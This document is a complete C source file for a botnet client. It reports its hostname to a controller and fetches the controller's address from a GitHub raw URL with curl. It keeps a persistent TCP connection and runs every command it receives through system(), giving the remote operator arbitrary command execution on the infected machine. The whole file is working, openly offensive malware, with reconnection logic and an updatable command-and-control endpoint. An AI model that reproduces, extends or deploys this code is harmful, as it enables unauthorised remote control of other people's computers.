#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

static int sock = -1;
static char idbuf[64];
static const char *AGENT_URL = "https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main/agent.txt";

static void sendline(const char *s)
{
    if (sock >= 0)
    {
        write(sock, s, strlen(s));
    }
}

static int fetch_agent_endpoint(char *out_host, int max_host_len, int *out_port)
{
    char line[256] = {0};
    int has_read = 0;

    // 1. Try local agent.txt first
    FILE *fp = fopen("agent.txt", "r");
    if (fp)
    {
        if (fgets(line, sizeof(line), fp) != NULL)
        {
            has_read = 1;
        }
        fclose(fp);
    }

    // 2. If not found or empty, fetch via curl
    if (!has_read)
    {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "curl -s -m 5 -L \"%s\" 2>/dev/null", AGENT_URL);
        FILE *pfp = popen(cmd, "r");
        if (pfp)
        {
            if (fgets(line, sizeof(line), pfp) != NULL)
            {
                has_read = 1;
            }
            pclose(pfp);
        }
    }

    if (!has_read)
    {
        return 0;
    }

    char *p = line;
    while (*p)
    {
        if (*p == '\r' || *p == '\n')
        {
            *p = '\0';
            break;
        }
        p++;
    }

    if (strlen(line) == 0)
    {
        return 0;
    }

    char *colon = strchr(line, ':');
    if (colon)
    {
        *colon = '\0';
        strncpy(out_host, line, max_host_len - 1);
        out_host[max_host_len - 1] = '\0';
        *out_port = atoi(colon + 1);
    }
    else
    {
        strncpy(out_host, line, max_host_len - 1);
        out_host[max_host_len - 1] = '\0';
        *out_port = 1337;
    }

    return (*out_port > 0 && strlen(out_host) > 0);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    char current_host[128] = "127.0.0.1";
    int current_port = 1337;

    signal(SIGPIPE, SIG_IGN);
    gethostname(idbuf, sizeof(idbuf) - 1);

    printf("[+] Bot initialized (Hostname: %s)\n", idbuf);

    if (fetch_agent_endpoint(current_host, sizeof(current_host), &current_port))
    {
        printf("[+] Target Agent endpoint: %s:%d\n", current_host, current_port);
    }
    else
    {
        printf("[!] Failed to read agent.txt, using default %s:%d\n", current_host, current_port);
    }

    time_t last_check = time(NULL);

    for (;;)
    {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
        {
            printf("[-] Failed to create socket: %s\n", strerror(errno));
            sleep(3);
            continue;
        }

        struct sockaddr_in sa;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(current_port);

        if (inet_pton(AF_INET, current_host, &sa.sin_addr) != 1)
        {
            struct hostent *h = gethostbyname(current_host);
            if (!h)
            {
                printf("[-] DNS lookup failed for %s, retrying in 3s...\n", current_host);
                close(sock);
                fetch_agent_endpoint(current_host, sizeof(current_host), &current_port);
                sleep(3);
                continue;
            }
            memcpy(&sa.sin_addr, h->h_addr, h->h_length);
        }

        printf("[*] Connecting to Agent (%s:%d)...\n", current_host, current_port);

        if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        {
            printf("[-] Connection to %s:%d failed (%s). Retrying in 3s...\n", current_host, current_port, strerror(errno));
            close(sock);
            fetch_agent_endpoint(current_host, sizeof(current_host), &current_port);
            sleep(3);
            continue;
        }

        printf("[+] Connected to Agent (%s:%d)! Handshaking...\n", current_host, current_port);

        char buf[256];
        snprintf(buf, sizeof(buf), "HELLO %s\n", idbuf);
        sendline(buf);

        struct pollfd pfd;
        pfd.fd = sock;
        pfd.events = POLLIN;

        while (poll(&pfd, 1, 10000) >= 0)
        {
            if (pfd.revents & (POLLERR | POLLHUP | POLLNVAL))
            {
                printf("[-] Connection poll error or hung up.\n");
                break;
            }

            if (pfd.revents & POLLIN)
            {
                int n = read(sock, buf, sizeof(buf) - 1);
                if (n <= 0)
                {
                    printf("[-] Server closed connection.\n");
                    break;
                }
                buf[n] = 0;

                char *saveptr = NULL;
                char *line = strtok_r(buf, "\r\n", &saveptr);
                while (line != NULL)
                {
                    if (strncmp(line, "PONG", 4) != 0 && strncmp(line, "SSH-", 4) != 0 && strlen(line) > 0)
                    {
                        printf("[+] Executing dispatched command: %s\n", line);
                        if (fork() == 0)
                        {
                            system(line);
                            exit(0);
                        }
                    }
                    line = strtok_r(NULL, "\r\n", &saveptr);
                }
            }
            else
            {
                printf("[*] Sending keep-alive PING to Agent...\n");
                sendline("PING\n");
            }

            time_t now = time(NULL);
            if (now - last_check >= 10)
            {
                last_check = now;
                char new_host[128] = {0};
                int new_port = 0;
                if (fetch_agent_endpoint(new_host, sizeof(new_host), &new_port))
                {
                    if (strcmp(new_host, current_host) != 0 || new_port != current_port)
                    {
                        printf("[*] Endpoint updated to %s:%d, reconnecting...\n", new_host, new_port);
                        strncpy(current_host, new_host, sizeof(current_host) - 1);
                        current_port = new_port;
                        break;
                    }
                }
            }
        }

        close(sock);
        sock = -1;
        fetch_agent_endpoint(current_host, sizeof(current_host), &current_port);
        sleep(3);
    }

    return 0;
}
